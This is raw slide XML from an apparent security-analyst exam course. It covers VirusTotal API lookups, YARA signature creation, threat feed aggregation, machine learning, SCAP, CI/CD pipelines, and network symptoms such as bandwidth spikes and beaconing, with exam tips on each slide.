              </a:rPr>
              <a:t>·  curl --request GET \--url https://www.virustotal.com/api/v3/domains/{domain} \-header 'x-apikey: &lt;your API key&gt;'</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147</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API AND MALWARE SIGNATURE CREATION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Error Codes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g_5ddf91845d.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1996729"/>
            <a:ext cx="10634472" cy="4007542"/>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148</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API AND MALWARE SIGNATURE CREATION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Automated Malware Signature Creation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Automated malware signature creation keeps defenses current against a rapidly mutating threat landscape by generating detection rules from analyzed samples rather than waiting on vendors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  YARA is the leading open-source tool for this, letting analysts write pattern-based rules using strings, byte sequences, and conditions to identify and classify malware families.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  YARA rules can be produced and shared quickly and are consumed by tools like VirusTotal, so a newly seen sample can rapidly be turned into detection across the environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts use YARA to hunt for variants of known malware, triage samples, and codify their own findings into reusable detection logic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for YARA as the answer for writing pattern-based rules to identify and classify malware samples and automate signature generation.</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149</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API AND MALWARE SIGNATURE CREATION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Automated Malware Signature Creation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Useful to keep up with rapidly changing malware threat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  YARA</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Identify and classify malware samples</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  virustotal.github.io/yara/</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150</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THREAT FEEDS AND MACHINE LEARNING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Threat Feed Combination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Threat feed combination is the practice of aggregating multiple disparate threat intelligence streams into a single, consistent view.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The challenge is that feeds arrive in different formats and schemas such as STIX/TAXII, CSV, or JSON, making them hard to compare or act on together.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scripting and normalization automate transforming these varied inputs into one unified format, deduplicating and standardizing indicators so they are easier to read, correlate, and act upon.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC, combining feeds improves coverage and confidence in indicators while reducing the manual effort and inconsistency of juggling many sources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frames threat feed combination as normalizing and aggregating multiple intelligence sources, often via scripting, into a single actionable format.</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151</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THREAT FEEDS AND MACHINE LEARNING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Threat Feed Combination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Aggregating disparate data streams is always difficult</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Threat feeds may provide data in different formats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scripting can help automate transforming data into a single format</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Easier to read, understand, and respond</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152</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THREAT FEEDS AND MACHINE LEARNING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Machine Learning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Machine learning is a field of computer science in which algorithms examine large datasets to reveal trends and indicators, learning from historical data to predict future behavior without being explicitly programmed for each case.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It sits alongside related disciplines such as data mining and data science, spanning the process, business, and analytical work of extracting previously unidentified value from large data sets and spotting trends.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In security, models trained on historical activity can flag anomalies, detect novel attack patterns, and reduce alert noise by prioritizing what is statistically significant.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts should understand both its power and its limits, including susceptibility to false positives, bias in training data, and adversarial manipulation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect machine learning to appear as a technique for anomaly detection and behavioral prediction from historical data, with awareness of its reliance on training data quality.</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153</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THREAT FEEDS AND MACHINE LEARNING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Machine Learning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Field of computer science</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Algorithms examine datasets to reveal trends and indicators that can predict future behavior</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An algorithm “learns” by using historical data to make predictions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154</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THREAT FEEDS AND MACHINE LEARNING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Machine Learning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Similar fields</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Machine learning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Data mining</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Data science</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Involves process, business side, machine learning, analysis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155</a:t>
            </a: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THREAT FEEDS AND MACHINE LEARNING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Machine Learning (3)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Data mining</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Looking at large data sets to extract previously unidentified valuable data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Machine learning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Looking for trends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156</a:t>
            </a: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THREAT FEEDS AND MACHINE LEARNING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Machine Learning (4)</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Useful in security analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Past attack behavior can predict what’s next</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Based on the natural tendency to stabilize</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Supervised vs. unsupervised learning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Examples: neural networks, decision trees, SVM, regression, etc.</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157</a:t>
            </a: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PROTOCOLS, STANDARDS, AND SOFTWARE ENGINEERING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Automation Protocols and Standards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The Security Content Automation Protocol (SCAP) is a suite of open standards maintained by NIST that standardizes how security tools express and exchange configuration, vulnerability, and compliance information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SCAP unifies component languages, reporting formats, identification schemes such as CVE and CPE, measurement and scoring systems like CVSS, and integrity mechanisms so that scanning and assessment can be automated and interoperable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  OpenSCAP is a widely used open-source implementation that evaluates systems against SCAP-defined baselines and produces standardized reports.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC and vulnerability management team, SCAP is the starting point for automating consistent, repeatable, and comparable security assessment across many systems.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests SCAP as the standard enabling automated, interoperable vulnerability and configuration assessment, tying together CVE, CPE, CVSS, and standardized reporting.</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158</a:t>
            </a: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PROTOCOLS, STANDARDS, AND SOFTWARE ENGINEERING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Automation Protocols and Standards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Security Content Automation Protocol (SCAP)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Great place to start to automate cybersecurity analysis tasks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Languages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Reporting formats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Identification schemes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Measurement and scoring systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Example: OpenSCAP</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159</a:t>
            </a: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PROTOCOLS, STANDARDS, AND SOFTWARE ENGINEERING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Software Engineering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Modern secure software delivery relies on a pipeline of automated practices: continuous integration (CI) merges developers' code changes into a shared repository frequently, automatically building and running tests on each commit to catch defects early.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Continuous delivery extends CI by automatically packaging and staging every validated build so it is always in a deployable state, with a manual approval gate before it reaches production, while continuous deployment removes that gate and pushes every passing change straight to production.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because these CI/CD pipelines are prime targets for supply-chain attacks and are also the ideal place to embed security controls, injecting SAST, DAST, dependency scanning, and secrets detection into the pipeline (DevSecOps) shifts security left so vulnerabilities are found before code ever ships.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on where to insert security testing into a CI/CD pipeline and on recognizing CI, continuous delivery, and continuous deployment as distinct stages of automated software delivery.</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160</a:t>
            </a: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PROTOCOLS, STANDARDS, AND SOFTWARE ENGINEERING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Software Engineering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Continuous integration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Continuous delivery</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Continuous deployment</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161</a:t>
            </a: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NETWORK SYMPTOMS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Diagnose Symptoms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Diagnosing symptoms is the analytical process of interpreting observable indicators, unusual network flows, resource spikes, error messages, or anomalous account behavior, to determine whether they signal a genuine security incident or a benign operational issue.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It works by correlating symptoms across the network, host, and application layers against a baseline of normal activity, so the analyst can distinguish, for example, a legitimate backup job from data exfiltration that looks similar on the wire.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst relies on this skill to triage alerts accurately, reduce false positives, and prioritize response, misreading a symptom can either waste effort on non-events or let a real compromise progress undetected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam presents scenario stems describing observed indicators and asks you to identify the most likely underlying cause or the correct next investigative step.</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162</a:t>
            </a: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NETWORK SYMPTOMS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Diagnose Symptoms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g_5a10ba09c7.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1876864"/>
            <a:ext cx="10634472" cy="4247271"/>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163</a:t>
            </a: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NETWORK SYMPTOMS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Network-Related Symptoms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Network-related symptoms are anomalies visible in traffic that suggest compromise: abnormal bandwidth consumption or sudden traffic spikes can indicate exfiltration or a DDoS, while traffic irregularities are deviations from established baselines in volume, timing, or destination.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Beaconing is the regular, periodic callback from an infected host to a command-and-control (C2) server, and peer-to-peer communications between internal endpoints can reveal lateral movement, worm propagation, or unauthorized file sharing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Rogue devices are unauthorized systems attached to the network, and scan sweeps are systematic probes across IP ranges or ports indicating reconnaissance; recognizing these patterns lets an analyst detect attacks that endpoint tools alone would miss.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: You will be asked to map a described network pattern, such as periodic outbound connections to the same external IP, to the correct symptom (e.g., beaconing to C2) and its stage in the attack lifecycle.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164</a:t>
            </a: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NETWORK SYMPTOMS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Network-Related Symptoms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g_d8fbcd15fa.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2464167"/>
            <a:ext cx="10634472" cy="3072665"/>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165</a:t>
            </a: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NETWORK SYMPTOMS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Network-Related Symptoms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Bandwidth consumption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Traffic spikes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Traffic irregularities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166</a:t>
            </a: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NETWORK SYMPTOMS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Bandwidth Consumption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Bandwidth consumption refers to the volume of data traversing a network link over time, and an unexpected rise in it is a classic indicator of malicious activity such as large-scale data exfiltration, a compromised host acting in a botnet, or an inbound/outbound flood.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts monitor it using flow data (NetFlow, IPFIX, sFlow), interface counters via SNMP, and bandwidth-monitoring tools, comparing current utilization against a known baseline and per-host norms to spot which system and destination are responsible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It matters to a SOC because sustained or off-hours bandwidth anomalies often surface an incident before any signature-based alert fires, giving early warning of exfiltration or a resource-abuse attack.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Exam scenarios describe abnormal throughput or utilization figures and expect you to conclude exfiltration or DoS and to name flow analysis as the detection method.</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167</a:t>
            </a:r>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NETWORK SYMPTOMS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Bandwidth Consumption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g_384721ed4a.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1705356" y="1783080"/>
            <a:ext cx="8778240" cy="4434840"/>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168</a:t>
            </a:r>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NETWORK SYMPTOMS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Network-Related Symptoms (3)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Beaconing</a:t>
